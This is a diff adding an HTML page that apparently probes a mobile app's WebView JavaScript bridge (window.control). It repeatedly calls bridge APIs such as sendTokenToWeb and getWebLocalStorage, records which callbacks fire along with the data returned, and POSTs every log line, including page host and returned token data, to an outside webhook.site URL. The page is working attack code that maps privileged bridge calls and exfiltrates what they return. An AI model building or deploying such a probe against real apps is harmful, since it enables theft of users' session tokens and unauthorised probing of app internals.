@@ -1,0 +1,26 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>bg-oracle</title></head>
+<body style="font:13px monospace;white-space:pre-wrap">
+<h3>bg-oracle: bridge filter decision oracle</h3><div id="out">boot</div>
+<script>
+var HOOK="https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217";
+var L=[],t0=Date.now();
+function T(){return "+"+((Date.now()-t0)/1000).toFixed(1)+"s";}
+function log(s){L.push(T()+" "+s);document.getElementById('out').textContent=L.join("\n");
+  try{fetch(HOOK,{method:"POST",mode:"no-cors",body:T()+" "+s});}catch(e){}}
+log("oracle start host="+location.host+" control="+(!!window.control));
+var n=0;
+function probe(){
+  if(!window.control){log("no control");return;}
+  n++;
+  // callback-style APIs: a fired callback == call was permitted & executed
+  ["getAppUsdtRateData","getNavigationBarHide","getWebLocalStorage","getInviteFriends","sendTokenToWeb"].forEach(function(api){
+    var fn="__cb_"+api+"_"+n;
+    var fired=false;
+    window[fn]=function(d){fired=true;log("FIRE "+api+" n="+n+" data="+(typeof d=="string"?d.slice(0,220):JSON.stringify(d)));};
+    try{ if(api=="getWebLocalStorage"){control[api](JSON.stringify({key:"__k",callbackFun:fn}));}
+         else {control[api](fn);} }catch(e){log("THROW "+api+" "+e);}
+    setTimeout(function(){ if(!fired) log("SILENT "+api+" n="+n+" (no callback -> rejected or no-op)"); },2500);
+  });
+}
+probe(); setInterval(probe,12000);
+</script></body></html>
